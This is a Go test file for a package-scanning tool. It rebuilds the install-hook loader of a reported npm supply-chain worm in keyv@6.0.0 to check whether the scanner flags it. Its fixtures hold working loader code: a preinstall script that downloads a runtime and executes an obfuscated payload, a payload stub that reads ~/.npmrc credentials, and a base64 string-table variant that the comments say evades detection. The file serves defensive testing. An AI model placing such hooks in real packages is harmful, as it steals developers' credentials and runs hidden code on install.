package intelligence

import (
	"testing"

	"github.com/chain305/chainsaw-core/installscripts"
)

// ChainDrop / keyv-cacheable worm (row 51). keyv@6.0.0 added only
// "preinstall": "node setup.mjs" plus two files: setup.mjs (Bun loader,
// 29,918 B, "rotated string table and a hex indexed decoder"; a second wave
// shipped an 11,017 B "lightly obfuscated rewrite") and Math_Symbol.js
// (727,680 B, "// @bun @bun-cjs", rotated 1,283-entry string table).
// setup.mjs downloads Bun from the official oven-sh releases and execs
// Math_Symbol.js with it (StepSecurity).
//
// Server byte scan (the provider the proxy also runs inline on the first
// download): which arm decides depends on bytes nobody retained.
//
//	A. loader names 'Math_Symbol.js' as a literal, payload is _0x-obfuscated
//	   -> escalated via the one-hop follower (NextHopScripts).
//	B. loader itself _0x-obfuscated (jaredwray wave)
//	   -> escalated on the first hop.
//	C. loader hides the filename in a non-_0x string table (second wave)
//	   -> NOT escalated: present only. Documented gap.
func TestAttack2026_51_ChainDrop_ByteScan(t *testing.T) {
	manifest := `{"name":"keyv","version":"6.0.0","main":"dist/index.cjs","files":["dist","setup.mjs","Math_Symbol.js"],` +
		`"scripts":{"preinstall":"node setup.mjs","test":"vitest run"}}`
	loader := "import https from 'node:https';import fs from 'node:fs';import path from 'node:path';\n" +
		"import {execFileSync} from 'node:child_process';\n" +
		"const dir=fs.mkdtempSync('/tmp/bun-dl-');\n" +
		"https.get('https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64.zip',r=>{" +
		"r.pipe(fs.createWriteStream(dir+'/bun.zip')).on('finish',()=>{execFileSync('unzip',['-o',dir+'/bun.zip','-d',dir]);" +
		"fs.chmodSync(dir+'/bun',0o755);execFileSync(dir+'/bun',[path.join(__dirname,'Math_Symbol.js')]);});});\n"
	payload := "// @bun @bun-cjs\n" + atkBObfuscatedJS("const t=require('fs').readFileSync(require('os').homedir()+'/.npmrc','utf8');\n")
	p := newInstallScriptsProvider()

	a := atkBRun(t, p, "keyv", "6.0.0", atkBTarball(t, map[string]string{
		"package.json": manifest, "dist/index.cjs": "module.exports=class Keyv{};\n",
		"setup.mjs": loader, "Math_Symbol.js": payload,
	}))
	if !a.InstallScriptFetches || a.InstallScriptKind != string(installscripts.KindFetchesRemote) {
		t.Fatalf("A (literal next hop, obfuscated payload): want fetches_remote, got %+v", a)
	}

	b := atkBRun(t, p, "keyv", "6.0.0", atkBTarball(t, map[string]string{
		"package.json": manifest, "setup.mjs": atkBObfuscatedJS(loader), "Math_Symbol.js": "// @bun\n",
	}))
	if !b.InstallScriptFetches {
		t.Fatalf("B (obfuscated loader): want fetches_remote, got %+v", b)
	}

	hidden := "import https from 'node:https';import fs from 'node:fs';import path from 'node:path';\n" +
		"import {execFileSync} from 'node:child_process';\n" +
		"const T='TWF0aF9TeW1ib2wuanM=,b3Zlbi1zaC9idW4=,YnVuLWxpbnV4LXg2NC56aXA='.split(',');\n" +
		"const D=i=>Buffer.from(T[i],'base64').toString();\n" +
		"const dir=fs.mkdtempSync('/tmp/bun-dl-');\n" +
		"https.get('https://github.com/'+D(1)+'/releases/download/bun-v1.3.13/'+D(2),r=>{" +
		"r.pipe(fs.createWriteStream(dir+'/b.zip')).on('finish',()=>{execFileSync('unzip',['-o',dir+'/b.zip','-d',dir]);" +
		"execFileSync(dir+'/bun',[path.join(__dirname,D(0))]);});});\n"
	c := atkBRun(t, p, "keyv", "6.0.0", atkBTarball(t, map[string]string{
		"package.json": manifest, "setup.mjs": hidden, "Math_Symbol.js": payload,
	}))
	if c.InstallScriptFetches || !c.HasInstallScript {
		t.Fatalf("C (filename hidden in a non-_0x string table): current behaviour is present-only, got %+v", c)
	}

	// Negative control: keyv@5.6.0 has no install hook at all.
	clean := atkBRun(t, p, "keyv", "5.6.0", atkBTarball(t, map[string]string{
		"package.json":   `{"name":"keyv","version":"5.6.0","main":"dist/index.cjs","scripts":{"test":"vitest run"}}`,
		"dist/index.cjs": "module.exports=class Keyv{};\n",
	}))
	if clean.HasInstallScript || clean.InstallScriptFetches {
		t.Fatalf("keyv@5.6.0 flagged: %+v", clean)
	}
}
